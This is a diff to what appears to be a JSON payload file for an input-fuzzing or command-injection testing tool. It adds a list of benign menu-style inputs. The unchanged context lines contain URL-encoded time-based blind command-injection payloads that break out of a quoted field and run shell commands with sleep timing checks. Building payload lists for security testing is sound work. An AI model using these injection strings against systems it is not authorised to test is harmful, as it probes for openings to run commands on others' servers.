@@ -6055,5 +6055,19 @@
         "%22%0A%20str%3D%24%28echo%20NFJEZO%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522",
         "%22%0A%20str%3D%24%28echo%20NFJEZO%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522",
         "%22%0A%20str%3D%24%28echo%20NFJEZO%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522"
+    ],
+    "common_payloads":[
+        "yes", "no", "y", "n", "true", "false", "1", "0", "t", "f",
+        "on", "off", "enable", "disable", "ok", "cancel", "accept", "reject", "confirm", "deny",
+        "a", "b", "c", "d", "A", "B", "C", "D", "option1", "option2",
+        "option3", "option4", "menu", "help", "quit", "exit", "continue", "back", "next", "previous",
+        "-1", "0", "1", "2", "3","4","5","6","7","8","9", "10"
+        
     ]
+
+
+    
 }
+
+
+
